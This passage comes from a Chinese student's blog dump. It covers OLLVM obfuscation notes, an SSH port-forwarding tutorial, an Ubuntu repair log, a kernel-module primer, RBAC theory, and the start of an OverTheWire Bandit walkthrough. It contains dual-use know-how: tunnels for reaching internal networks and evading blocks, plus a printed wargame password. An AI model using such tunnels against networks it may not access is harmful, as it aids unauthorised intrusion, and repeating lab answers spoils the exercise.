指令支持1种替换方法，分别是\n a = a ^ b =\u003e a = (!a \u0026 b) | (a \u0026 !b)      StringObfuscation 有很多大佬对于ollvm的混淆进行了升级，每个版本对于其混淆的实现方式各不相同，这边我分析的是上海交通大学的孤挺花项目的字符串混淆实现分析，项目地址为：https://github.com/GoSSIP-SJTU/Armariris\n与上面三种原有项目的混淆方式不同，字符串混淆的类StringObfuscationPass继承至ModulePass，在入口函数runOnModule里重写了父类函数，在里面实现了加密，在私有函数中实现了解密函数，在加密的末尾实现了调用，保证函数运行的正确性\n函数的思想：是以两个vector来存储静态变量和加密后的字符串，利用Module类的global_iterator迭代器遍历全局变量，判断是否为.str.类型，即字符串类型，进行加密替换，加密方式采用了最原始的异或加密\nbug寻找 适配llvm9.0和ollvm4.0时发生了许多错误\n可见 bug_Log\nSegmentation Fault 的原因若干\n最快的当然还是把相关错误的llvm4.0的代码移植到llvm9.0处\n解决string_obf error编译时报强制转换类型错误方法 ：http://hellollvm.org/slides/porting-ollvm.pdf\n http://hellollvm.org/\n 对抗 //TODO：大坑，现在对逆向还不是很熟悉，先对方法了解一波\n引用项目Fllvm(虽然他不开源)中，作者对自己改写的ollvm变版fllvm的自信，来学习对抗ollvm的方式\n Fllvm与当前反混淆工具的对抗：当前应对ollvm混淆的大体方法为：自写脚本、bcf、decllvm、符合执行。前三个无论是自己找规律，还是基于capstone(反汇编引擎)，对Fllvm都只存在理论的可行性，基本用途不大。\n 由作者一段话可知，大概就是找规律写脚本复原，或者采用符号执行的方式去反混淆(原谅我真的找不到作者所说的bcf是啥)\n我看的大多找规律的都是从原版ollvm的混淆方式入手，写反混淆的脚本去运行\n还是能用符号执行分析的大佬比较nb\n 资料：\n反混淆：恢复被OLLVM保护的程序\n[原创]ARM64 OLLVM反混淆\nAndroid OLLVM反混淆实战：基于Angr\n基于符号执行的反混淆方法研究.pdf\n基于符号执行的反混淆方法研究.pdf\n利用符号执行去除控制流平坦化\n反混淆：恢复被OLLVM保护的程序\n使用Binary Ninja去除ollvm流程平坦混淆\n 关于逆向：https://blog.yuuoniy.cn/2018/08/03/XMAN-reversing-1/\n    基于Miasm框架(一个Python开源逆向工程框架)，进行反混淆  https://github.com/cea-sec/miasm 反混淆：恢复被OLLVM保护的程序\n IDA插件，利用micro code API进行反混淆  Hex-rays：Hex-Rays Microcode API vs. Obfuscating Compiler 项目地址：Github-RolfRolles / HexRaysDeob 使用IDA microcode去除ollvm混淆(上)\n  DecLLVM，针对OLLVM的IDA分析插件 Github-F8LEFT / DecLLVM Gitlab-F8LEFT / DecLLVM 吾爱破解2016安全挑战赛cm7 Android CrackMe 分析详解\n  Unicorn 引擎 [翻译]Unicorn引擎教程 [原创]使用unicorn engin还原Armariris字符串混淆\n  Angr 符号执行框架 Github里有\n    关于符号执行：\n符号执行是一种重要的形式化方法和软件分析技术，通过使用符号执行技术，将程序中变量的值表示为符号值和常量组成的计算表达式，符号是指取值集合的记号，程序计算的输出被表示为输入符号值的函数，其在软件测试和程序验证中发挥着重要作用，并可以应用于程序漏洞的检测。\n符号执行的发展是从静态符号执行到动态符号执行到选择性符号执行，动态符号执行会以具体数值作为输入来模拟执行程序，是混合执行(concolic execution)的典型代表，有很高的精确度，目前较新的符号执行工具有Triton和angr\n关于符号执行的paper：https://github.com/saswatanand/symexbib\n符号执行的框架：Miasm、Angr、Triton\n ","description":"Learning about ollvm","tags":["reverse","ollvm"],"title":"ollvm-learning","uri":"/posts/ollvm-learning/"},{"categories":["linux","network"],"content":"SSH端口转发  参考：\nssh端口转发的三种方式\nSSH 端口转发教程\n[玩转SSH端口转发](https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/)\n实战 SSH 端口转发\n 课上看老师演示过，感觉端口转发这个操作真的是贼好用，直接利用外部公网ip连接到了他的虚拟机内网，便想具体学习学习\n总所皆知，ssh是我们常用的工具之一，基本快赶上vim的使用频率。我们一般都会使用ssh来进行远程连接服务器，但是这次来学习一次ssh骚操作——ssh端口转发\nSSH端口转发也被称作SSH隧道(SSH Tunnel)，因为它们都是通过SSH登陆之后，在SSH客户端与SSH服务端之间建立了一个隧道，从而进行通信。SSH隧道是非常安全的，因为SSH是通过加密传输数据的(SSH全称为Secure Shell)。\nSSH有三种端口转发模式，本地端口转发(Local Port Forwarding)，远程端口转发(Remote Port Forwarding)以及动态端口转发(Dynamic Port Forwarding)。对于本地/远程端口转发，两者的方向恰好相反。动态端口转发则可以用于科学上网。\n本地端口转发 本地端口转发（Local Port Forwarding），是将本地主机某个端口流量转发到远程主机的指定端口。其命令行语法是：ssh -L [bind_address]:localport:remote_host:remote_port。\nssh -L 本地网卡地址:本地端口:目标地址:目标端口\n也可以是：ssh -L [bind_address]:port_a:remote_host:port_b user@host\n将本地绑定的地址的a端口的流量转发至user@host主机的remote_host的port_b端口\n1  $ ssh -L 1234:localhost:22 root@remote_ip   如上所示，我们在本地将1234端口的数据转发到远程主机的22端口，访问我本地localhost的1234端口(左)，等于以localhost的身份访问我远程主机22端口\n上图中，远程的机器上起了一个服务 python3 -m http.server，它监听端口 8000，现在我们想在本机访问这个服务，但由于防火墙的存在，8000 端口无法直接访问，于是我们使用 ssh 端口转发。首先在 A 上执行 ssh -L 1234:localhost:8000 user_b@ip_b 建立 ssh 隧道，它表示：所有对 A:1234 端口的请求，相当于在 B 机器上对 localhost:8000 的请求。因此在 A 上执行 curl localhost:1234 就相当于访问 B 机器上的 python 服务。\n假如web服务部署在其他机器上(Remote Machine C)，可以看到我们只是把上例中的 localhost 换成了 C 机器的 hostname/IP 就可以了。此时，发送到 A:1234 的请求相当于从 B 机器上对 remote:8000 的请求，图中在 /etc/hosts 中设置了 hostname 和 IP 的对应关系，直接用机器 C 的 IP 也是可以的。\n同时可以看到，机器 A 由于防火墙无法访问内网的服务，但是由于①机器A可以ssh到内网机器B②B有权限访问到内网的其他服务，通过本地端口转发可以实现从A访问内网的服务。\n机器A通过ssh隧道访问本地端口，相当于机器B访问remote:port。\n远程端口转发 远程端口转发（Remote Port Forwarding），是将将发送到远程端口的请求，转发到目标端口。其命令行语法是：ssh -R 远程网卡地址:远程端口:目标地址:目标端口。\n当然也可以是：ssh -R \u003cprot_a\u003e:\u003cremote_host\u003e:\u003cport_a\u003e user_a@ip_a\n远程转发最常用的功能是内网穿透。有一个公网ip的主机，便可以借助ssh隧道的远程转发实现内网渗透，达到外网访问内网资源的目的。需要注意的是ssh远程转发默认只能绑定远程主机的本地地址，即127.0.0.1。如果想要监听来自其他主机的连接，需要修改远程主机ssh的配置,将\"GatewayPorts\"改成“yes”，重启ssh后生效。\n如图，假如A可以联网且有公网ip，B可以联网（即可以远程连接A），此时执行命令的是属于内网里且没用公网ip的机器B\n我们可以通过访问A的公网ip达到访问内网BC所部署的服务\n简单来说在本地执行ssh命令称为本地转发，在远程机器中执行命令就属于远程转发\n动态端口转发 无论本地转发还是远程转发，都需要指定本地和远程主机的端口。动态转发（Dynamic Port Forwarding）则摆脱这种限制，只绑定本地端口，远程主机和端口由发起的请求决定。动态转发的语法是：ssh -D bind_address:port，也可以是ssh -D \u003cport\u003e user@remote_ip，一个转发示例：\n1  $ ssh -D 8080 username@host   该命令让ssh监听本地8080端口，经过8080端口的流量都通过ssh隧道由远程服务器代为请求，从而达到获取被屏蔽资源、隐藏真实身份的目的。\n这个模式对本地和远程转发都有效，它的工作模式和 Shadow Socks 很像，会在本地创建一个 Socks5 代理服务，监听端口 \u003cport\u003e，并将所有请求转发到远程机器上\n动态转发实际上实现了正向代理功能，因此可以用来科学上网。本地转发也可以做正向代理，但要对每一个请求的主机和端口做转发，比较繁琐，实践中不会这么用。\n图中我们通过 curl -x socks5h://... 来指定使用 Socks5 代理，在机器 A 上请求 ip_c:8000 时，相当于在 B 机器上发起对 ip_c:8000 的请求。\n  在我自己的虚拟机和云主机之间实验，有些挺成功的，但也有些失败，比如动态转发这，不知道为啥连上了阿里云的服务器却连不上网，提示连接被重置，有可能是我云端那没有配置好 其次是远程转发时其实翻了好多次车，一直会把端口弄混，但是有个瑕疵就是远程转发时，我启动自己的flask的web服务，却一直curl不到东西，用http.server却成功了，可能是哪里有问题没有发现把  ","description":"","tags":["ssh"],"title":"SSH端口转发","uri":"/posts/ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"categories":["linux"],"content":"关于VMware虚拟机中，Ubuntu开机黑屏解决若干 相当于Mark\n没想到，在写系统安全内核模块时，锁屏开出来后，他界面就崩了，我想着重启能解决一切问题，然后重启完他就凉了\n一直在冒一个白色的光标，心想着继续重启看看有没提示\npiix4_smbus:HostSMBuscontrollernotenabled 然后再启动一行时看见这个，搜索解决办法\n但是网上都是大同小异的办法——进入终端，禁用模块\n但是我没有终端啊\n最后查到开机时一直按shift可以进入一个选择启动界面，类似windows的bios\n进去后就可以选择恢复模式，以root身份进入\n https://blog.csdn.net/jays_/article/details/80848666\nhttps://www.cnblogs.com/elixforever/p/4924492.html\n 然而解决完再次重启，却还是黑屏，虽然少了那一行，但我已经知道了，这不是关键问题\n https://blog.csdn.net/what_about_us/article/details/81207926\n 然后就想着以黑屏的方式直接搜解决办法，然后就看到上面这个链接有着综合的解释，便学着他mark下来\n尝试了其中的办法，发现原来真的是图形界面崩了，按住crtl+alt+F2~6可以进入tty2~6，也就是无图形化终端\n想着我下午也同时开过vmware和wegame，然后把vmware给暂停了，搜出来这种情况有可能是LSP问题\n https://www.cnblogs.com/zhang-yawei/p/12071970.html\n​\t虚拟机和主机之间的通信，基本上是以 socket 的方式进行通信的（这里的 socket 泛指一切 socket，包括本地的、网络的等等）；\n　某个程序通过 LSP 给系统的 TCP/IP stack 注入了自己的 DLL，如果程序退出时，没有把这个 DLL 收回来，或者回收失败、没有彻底回收等，那么这个 DLL 残留的东西影响了整个 TCP/IP stack，而且是永久性的。 每个 socket 收发的数据包是要经过 TCP/IP stack 的，这个 DLL 可能会对这些 socket 的数据包做了些什么操作（比如修改数据、直接丢弃等等），然后所以你的虚拟机就黑屏了…… netsh winsock reset这条命令会重置，所以那些被注入的 DLL 就被清理掉了，所以一切都是最初的模样了……\n 但是我用这个命令重启之后，以为他能恢复原样，但是他没有！\n用tty1的startx进入黑屏，然后他就没法动了，我们进tty2的ps -ef 查看进程，发现都是正常的啊\n可见gnome正常运行啊\n https://askubuntu.com/questions/999180/16-04-to-17-10-login-loop-because-of-xsession-and-upstart\n 果然还是google靠谱，找到了一个方法，让我看到了桌面，不过又报了下面这行错误\ncould not set the configuration for CRTC 63 然后没有搜到解决办法，太晚了，先睡\n 我们还是从正常方式去debug吧，既然是图形化界面崩了，就去找gnome的错误日志\n不过之前调中文还得先搞英文来，太难了\n https://wiki.ubuntu.org.cn/%E4%BF%AE%E6%94%B9locale\n 调完之后，去/var/log下查看日志\n太多且太杂了，准备清空日志，重新复现错误\n 清空日志：https://www.cnblogs.com/Jimmy1988/p/8892483.html\n 找到疑似的几个错误，注意10:51:02是正常启动完系统进入tty1的时间\n后面全是主题解析错误，也就是无法打开桌面\n但是根据第二张图的日志中lightdm.service一直在重启失败\n LightDM：Light Display Manager，是一个轻量级linux桌面显示管理器\nLightDM_百度百科\n 我们看下服务状态\n然后发现服务启动过后，卡在了莫名其妙的地方\n想要更新软件包试试\n然后发现还没网\n https://blog.csdn.net/zhu334974857/article/details/77198545\nhttps://www.geek-share.com/detail/2706261264.html\n 然后发现应该是dns的问题\n然后更新软件包之后，我竟然看到了久违的桌面了\n应该就是软件包有相互不兼容的情况导致lightdm启动失败\n重装ubuntu桌面，然后有了循环登陆错误\n看了下别人的解决办法，没有相符的，大多都是与N卡驱动不兼容，卸载N卡驱动然后重装，结果我想着这思路，前面解决办法中新装了一个unity，我直接apt remove unity然后就进去了woc\n终于把这个ubuntu搞好了，果然没有重装解决不了的问题，唯一不好的就是我用的ubuntu16.04一不小心升级成了ubuntu.18.04，不过心情倍爽儿\n","description":"","tags":["ubuntu"],"title":"VMware-Ubuntu-blackScreen-fix","uri":"/posts/vmware-ubuntu-blackscreen-fix/"},{"categories":["linux"],"content":"Linux 内核编程入门\u0026简介  Linux可加载内核模块是 Linux 内核的最重要创新之一。它们提供了可伸缩的、动态的内核。其它开发者可以不用重新编译整个内核便可以开发内核层的程序，极大方便了驱动程序等的开发速度。\n  参考：\n小白学Linux之内核模块编程\nlinux内核编程\n黑客内核：编写属于你的第一个Linux内核模块\nlinux mod相关命令\u0026内核模块化\nlinux内核编程入门 hello world\n 由于系统安全这门课刚上来，就给了一个内核编程的实例，我不得不找些资料学习学习\n 什么是内核模块：内核模块是具有独立功能的程序。它可以被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间中运行。模块编程和内核版本密切相连，因为不同的内核版本中某些函数的函数名会有变化（所以我在编译老师给的实例时报错了），因此模块编程也可以说是内核编程。   https://lxr.missinglinkelectronics.com/linux：这个网址里可以查到所需用的linux内核函数所在位置\n当然，也可以在linux源码下找到，可能比较慢：https://github.com/torvalds/linux（github，search this repository）\n  内核模块编程特点： 模块本身不被编译进内核映像，从而控制了内核的大小；模块一旦被加载，就和内核中的其他部分完全一样。   Linux驱动程序有两种加载方式：一种是静态地编译进内核，内核启动时自动加载，另一种是编写为内核/驱动模块，使用insmod命令将模块动态加载到正在运行的内核，不需要时用rmmod命令将模块卸载。\n 上图为linux内核加载过程\n用户层编程和内核模块编程的区别     应用程序 内核模块程序     使用函数 libc库 内核函数   运行空间 用户空间 内核空间   运行权限 普通用户 超级用户(superuser)   入口函数 main() module_init()   出口函数 exit() module_exit()   编译 gcc makefile   链接 gcc insmod   运行 直接运行生成的./a.out insmod   调试 gdb kdbug、kdb、kgdb    内核编程：Hello World 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  #include \u003clinux/init.h\u003e#include \u003clinux/module.h\u003e#include \u003clinux/kernel.h\u003e //模块许可证声明,必须 MODULE_LICENSE(\"GPL\"); //模块加载函数,必须 static int hello_init(void){ printk(KERN_ALERT \"Hello Kernel!\"); return 0; } //模块卸载函数,必须 static void hello_exit(void){ printk(KERN_ALERT \"goodbye,kernel/n\"); } //模块的注册 module_init(hello_init); module_exit(hello_exit); // 以下可选 //声明模块的作者 MODULE_AUTHOR(\"Magic\"); //声明模块的描述 MODULE_DESCRIPTION(\"This is a simple example!/n\"); //声明模块的别名 MODULE_ALIAS(\"A simplest example\"); //声明模块的版本 MODULE_VERSION(\"version_string\"); //声明设备表,对于USB,PCI等设备驱动,通常会创建一个 MODULE_DEVICE_TABLE(\"table_info\");   在内核编程时，与往常应用编程时类似而又有所不同\n开头为内核编程所必须的三个头文件\n最明显的就是函数入口由main()变成了module_init，又或者像下面直接写出init_module()\n在内核编程中，module_init(begin_func);是指定begin_func为该模块的入口，而相对应的module_exit(exit_func)指定了模块退出时的出口函数为exit_func，这两者皆为模块加载函数\n  模块加载函数，这部分是必须的。模块加载函数必须以module_init(func)的形式被指定。它返回整形值，若初始化成功，应返回0。在上面那个例子当中，hello_init()函数就是模块加载函数需要执行的，主要是打印一条信息。\n  跟模块加载函数相对应的就是模块卸载函数，这部分也是必须的。模块卸载函数在模块卸载的时候执行，不返回任何值，必须以module_exit(func)的形式来指定。在上面的例子中，hello_exit()函数就是模块卸载函数需要执行的，只要是打印了一条退出信息。\n  模块许可证声明，这部分是必须有的。模块许可证（LICENSE）声明描述内核模块的许可权限，如果不声明LICENSE，模块被加载时，将收到内核被污染（kernel tainted）的警告。大多数情况下，内核模块应遵守GPL兼容许可权。Linux2.6内核模块最常见的是以MODULE_LICENSE（\"Dual BSD/GPL\")语句声明模块采用BSD/GPL双LICENSE。\n  再者，其中的函数有所不同，比如printk()是由内核定义的，把要打印的信息输入到系统日志中，可以用dmesg命令查看\n\u003e\u003e\u003e此外，模块加载函数有另外一种写法\n1 2 3 4 5 6 7 8 9 10 11 12 13  static int __init hello_init(void){ //init  printk(\"hello tiger/n\"); return 0; } static void __exit exit(void){ //exit code \tprintk(\"bye bye!/n\"); }   这种写法与前面不同，就是加了__init和__exit前缀，与第一种写法来说，会比较节省内存\n __init 和 __exit 是 Linux 内核的一个宏定义，使系统在初始化完成后释放该函数，并释放其所占内存。\n在 linux 内核中，所有标示为 init 的函数在连接的时候都放在 .init.text 这个区段内，此外，所有的 init 函数在区段 .initcall.init 中还保存了一份函数指针，在初始化时内核会通过这些函数指针调用这些 __init 函数，并在初始化完成后释放 init 区段（包括 .init.text,.initcall.init 等）。\n__exit和 __init 一样， __exit 也可以使对应函数在运行完成后自动回收内存。\n 之后，编写完C文件之后就要对其进行相对应的操作，把他编译成内核文件。\n要知道不同环境下，内核版本不一样的可能性极高，再考虑到路径等问题，为了编译方便，一般都采用Makefile的文件形式，来简化内核版本号、路径、以及编写模块的路径和信息\n1 2 3 4 5 6 7 8 9 10 11 12 13  obj-m += hello.o #generate the path CURRENT_PATH:=$(shell pwd) #the current kernel version number LINUX_KERNEL:=$(shell uname -r) #the absolute path LINUX_KERNEL_PATH:=/usr/src/linux-headers-$(LINUX_KERNEL) #complie object all: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules #clean clean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean   这是老师给的样例，还会打印现有的所有进程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  #include \u003clinux/kernel.h\u003e#include \u003clinux/module.h\u003e#include \u003clinux/sched.h\u003e#include \u003clinux/sched/signal.h\u003e#include \u003clinux/sched/task.h\u003e int init_module(){ printk(\"Hello world\\n\"); extern unsigned long volatile jiffies; struct task_struct *p = \u0026init_task; do{ printk(\"%d %s\\n\", p-\u003epid, p-\u003ecomm); p = next_task(p); } while (p!=\u0026init_task); return 0; } void cleanup_module(){ printk(\"bye\\n\"); } MODULE_LICENSE(\"GPL\");   以及其简单的Makefile\n1 2 3 4 5 6  obj-m := hellops.o KDIR := /lib/modules/$(shell uname -r)/build PWD := $(shell pwd) default: $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules   运行结果如上\n 一些常用的linux内核函数：https://blog.csdn.net/guowenyan001/article/details/43342301\n 内核模块的操作 编写好内核模块的函数之后，经过编译，我们就得到了所要的内核模块的执行文件xxx.ko\n以下就是我们可以对这个文件操纵的一些命令\n1 2 3 4 5 6  $ insmod xxx.ko #将模块装入内核种 $ rmmod xxx.ko #将模块从内核种删除 $ lsmod | grep xxx #列表显示所有的内核模块，类似ls命令 $ modprobe -v xxx.ko #自动处理载入模块，一般用于载入指定的个别模块或一组相依赖的模块 $ depmod /PATH/TO/MODULES_DIR #查看模块依赖 $ modinfo #查看模块的具体信息   modprobe: modprobe可载入指定的个别模块，或是载入一组相依赖的模块。modprobe会根据depmod所产生的依赖关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。依赖关系是通过读取 /lib/modules/2.6.xx/modules.dep得到的。而该文件是通过depmod 所建立。\n 关于modprobe的相关\n模块加载——modprobe和insmod的区别(转)\nLinux下使用modprobe加载驱动\n ","description":"","tags":["linux"],"title":"Linux内核编程入门","uri":"/posts/linux%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/"},{"categories":["linux"],"content":"Role Based Access Control  参考：\nSpring Security 实战干货： RBAC权限控制概念的理解\nRole-Based-Access-Control__sandhu96.pdf\n什么是 Azure 资源的基于角色的访问控制 (RBAC)?\nRole Based Access Control\n  RBAC的简介  RBAC：Role Based Access Control：基于角色的访问控制  RBAC的概念起源于早期的多用户计算机系统，他的兴起是因为人们需要通用的多用途的可定制工具\nRBAC简化了权限管理，与用户组的概念相近\nRBAC支持三个著名的安全性原则：最少特权、权限分离、数据抽象\n  最小特权原则，只有该角色完成任务所需的权利被赋予该角色 职责分离原则，确保互斥角色来完成一项敏感任务，例如比赛中，裁判不能同时是参赛选手 数据抽象原则，权利依靠抽象完成，例如借记卡和信用卡对于一个账户，而不是用操作系统提供的读写执行的权利   对于RBAC，简单来说，就是将用户对应一个身份，而一个身份拥有相应的权限，如下图所示\n就如同公司的项目经理，人事经理，上到CEO，CTO等等，每个职位有着相应的权限，而且在每个公司的CTO可以拥有不同的权限，同时CTO也可以由不同人来担任。把这个关系映射到计算机系统来，就是基于角色的访问控制。\n相较于直接将权限分配给用户，这种RBAC的机制有着较强的扩展性，也便于权限管理：在权限更改时，无需遍历所有用户，增加了提权的效率，以及降低了漏调权限的概率，这样用户和资源权限解除了耦合性，这就是 RBAC 模型的优势所在。\nRBAC的分类 RBAC模型可以分为：RBAC0，RBAC1，RBAC2，RBAC3 四种。其中RBAC0为基础，其他都是因RBAC为基础的变种。其中他们的关系可以由下图所示。\nRBAC0是最低层的基本模型。RBAC1和RBAC2都包含的RBAC0的所有特征，并且在此基础上添加了一些独立的功能，同时也被称为advanced models\nRBAC1相较于RBAC0添加了角色继承的概念，即角色可以从其他角色中继承权限，感觉有点类似面向对象中类的继承\nRBAC2添加了一些限定条件，简单来说就是为了职责分离，防止既是参赛选手又是裁判的情况出现\nRBAC3合并了RBAC1和RBAC2，由于传递性，肯定也包含了RBAC0的特征\nRBAC模型的基本特征由下图所示\nRBAC0 ——Base model 这个模型中，有三组实体：User(用户)，Roles(角色)，Permission(权限)，上图中也有**Sessions(会话)**的集合\n用户：可以是智能的自治代理，例如机器人、静止的电脑甚至是电脑中的网络，简单的，我们可以认为一个用户就是一个人\n角色：一个角色就是一个工作职能或工作名(职务名)，具有与授予角色成员的权限和责任的相关联的语义\n权限：是一种对系统内一个或多个对象访问的模式的许可，授权条款、访问权限、优先级都象征着权限，权限的概念可以是多样化的\n在这个框架里，拒绝访问被认为是一种约束，而不是一种拒绝的权限\n权限的性质使其依赖于系统的实现细节和系统本身，因此一个访问控制的通用模型将权限看作为一个扩展的没有解释的符号。每个系统保护着他自己实现的抽象对象，因此操作系统维护着像文件、目录、设备、端口等以及其读写执行的权限。一个关系型数据库管理系统维护着关系、元组、属性、视图以及其insert、update、delete、select等操作\n权限可以应用于单个或多个对象\n正如上图所说，**用户和角色，角色和权限都是多对多的关系。**一个用户可以拥有多个角色，一个角色也可以拥有多个用户，相似的，一个角色可以拥有多个权限，一个权限也可以被多个角色所拥有。RBAC的关键性设计就在这两个多对多的关系。这种对应关系最后使得一个用户可以行使一种权利。把角色当作用户和权限的中间人提供了更好的访问控制设置，更加直接的将用户和权限联系起来\n对话(Session)：是一种一个用户和多种角色的映射。当用户想要激活他所属的一些角色时，一个用户将会建立起一个对话。在对话里，对话和角色是一对多的关系，用户对应的多种角色在对话里同时被启用，对话里所有角色所拥有的权限都可以被用户所使用。每个对话和一个单一的用户绑定，这种绑定在一个对话的生命周期内保持不变。\n在同一时间内，一个用户可能有多个对话，每个对话都在一个不同的工作窗口。每个对话有可能有不同的角色绑定。这个RBAC0的功能支持最小特权原则。一个用户可以激活他所拥有角色集合的任意子集，保证其在一个对话中对于一个任务最合适。因此，拥有一个强大权限的角色一般为不激活，当他被需要时，才去激活他。在一个对话的生命周期内，RBAC0也允许角色的动态激活和失效。\n假如将RBAC0以形式化语言说明，那么可以看看下图所示\nRBAC1 ——Role hierarchies 角色继承是一种结构化角色的方法，去反应组织的权限和责任的结构\n这边继承的概念就如面向对象中继承的特性一样，论文中的例子我就不再复述了。\n直接在此给出论文中形式化语言的描述\nRBAC2 ——Constraints 实际上，RBAC1和RBAC2没有包含关系，虽然他们在数字版本上是相邻的。正如RBAC模型的关系里，这两个是属于并列关系的。\n约束(Constraints)也是RBAC模型中重要的一方面。\n在论文中，是采购经理和财务经理的关系，这两个职责明显不能由同一个人来担任，因为这回造成欺诈。这是一个历史悠久的原则——职责分离。不过对于例子，我更喜欢在博客中看到的这个例子：一个人不能再比赛中同时担任参赛选手和裁判，这明显的会造成比赛公平性缺失，虽然这在现实中几乎不可能发生，但我觉得这是对于这个方面最直观的体现。\n约束是在更高等级组织政策中一种有力的机制。确定的角色需要被定义为相互排斥的，即职责分离。\n只要RBAC的管理是被一个高级安全官员完全中心化管理的，约束就是非常的方便，同时也体现了高级安全官员的决策影响十分重大。但假如RBAC的管理去中心化，约束就变成了一种机制，使得级别高的安全官员可以限制用户行使管理权限\n约束应用于User Assignment和Permission Assignment的关系，使得返回一个函数值为接收或者不接受。\n以下是论文中对约束的定义\n在这个定义下，权限必须具有原子性\n有些角色产生的历史原因就是为了制约另一个角色，裁判员就是为了制约运动员从而让运动员按照规范去比赛。如果一个人兼任这两个角色，比赛必然容易出现不公正的情况从而违背竞技公平性准则。还有就是我们每个人在不同的场景都会充当不同的角色，在公司你就是特定岗位的员工，在家庭中你就是一名家庭成员。随着场景的切换，我们的角色也在随之变化。所以 RBAC2 在 RBAC0 的基础上引入了静态职责分离（Static Separation of Duty，简称SSD）和动态职责分离（Dynamic Separation of Duty，简称DSD）两个约束概念。他们两个作用的生命周期是不同的;\n  SSD 作用于约束用户和角色绑定时。 1.互斥角色：就像上面的例子你不能既是A又是B，互斥的角色只能二选一 ; 2. 数量约束：用户的角色数量是有限的不能多于某个基数； 3. 条件约束：只能达到某个条件才能拥有某个角色。经常用于用户等级体系，只有你充钱成为VIP才能一刀999。\n  DSD 作用于会话和角色交互时。当用户持有多个角色，在用户通过会话激活角色时加以条件约束，根据不同的条件执行不同的策略。\n  RBAC3 ——Consolidated Model RBAC3将RBAC1和RBAC2的特性结合起来，也就是在RBAC0的基础上同时拥有了角色继承和约束的两个特性。\n约束可以被应用于角色继承中。例如约束可以限制一个角色的数量，比如一个公司只能有1个ceo；在此模型中，约束可以是多样化的，不仅可以约束角色的数量，也可以约束角色的关系。\n约束在某些情况下非常有用，尤其是在更改角色层次结构的权限已经被分散的情况下\n管理模型——Management models 以上的管理模型都是基于单个安全管理员，在大型系统中，一般都有一个安全管理团队\n那么问题就来了，RBAC如何管理自己呢？\n作者给出了如图下这样一种模型\n在此模型中，约束应用于RBAC中的任一部分，图中上半部分与和RBAC0的基本模型的类似，增加了下半部分，用于对管理角色(AR)和管理权力(AP)的说明，普通权限只能给普通角色，而管理权限只能给管理角色，这是个内在约束。 作者认为在管理管理层次时，只需要一个主要的安全管理员就够了，不需要第二个管理层次来管理第一个。\n 管理者的权力包括：\n 修改UA 修改PA 修改角色层次关系   RBAC中的管理权限可以看作是修改用户分配，权限分配和角色层次关系的功能。在管理模型中，必须显式定义这些管理操作的权限。这些权限的确切性质是具体实现，但是他们的一般性质几乎相同。\n一般地，每个管理角色都将映射到她负责管理的角色层次结构的某个子集。管理的其他方面也需要限定范围，比如删除行为和修改行为就不一样，可以在此限定范围。\n概念理解 角色（Role） 角色是一个组织中的一个职务职能或职称\n角色的概念与在访问控制中的用户组的概念相近，但是一个角色是把一组用户和一些权限关联在一起，而用户组却只能代表一组的用户\n多角色分配：假如有一个用户被分配到了多种角色，那么会怎么样呢？RBAC是一个加法模型，因此，该用户会拥有其所分配到的所有角色所具有的权限。\n权限（Permission） 权限具有原子性，不可再分\n在RBAC框架里，拒绝访问被建模为一个约束，而不是一个否定的权限。\n","description":"","tags":["linux","security"],"title":"Role-Based-Access-Control","uri":"/posts/role-based-access-control/"},{"categories":["ctf"],"content":"鉴于最近的状态，看逆向又看不进去，就找了个简单的靶场玩一玩\nhttps://overthewire.org/wargames/\nWargames Suggested order to play the games in  Bandit Leviathan or Natas or Krypton Narnia Behemoth Utumno Maze …  Bandit  From the official tips: There are several things you can try when you are unsure how to continue:\n First, if you know a command, but don’t know how to use it, try the manual (man page) by entering “**man **” (without the quotes). e.g. if you know about the “ls” command, type: man ls. The “man” command also has a manual, try it. Press q to quit the man command. Second, if there is no man page, the command might be a shell built-in. In that case use the “**help **” command. E.g. help cd Also, your favorite search-engine is your friend. Learn how to use it! I recommend Google. Lastly, if you are still stuck, you can join us on IRC   Level 0 关于ssh的用法\n1  ssh bandit0@bandit.labs.overthewire.org -p 2220   连上主机后便可以开始游戏\n--[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! Level 1 ls之后得到flag，即下一关的密码（不知道为啥windows的CMD一直登陆不仅\n建议用linux,windows是玄学\n1 2  bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1   wargame的原理就是上一关的flag是下一关ssh的密码\nLevel 2 1 2 3 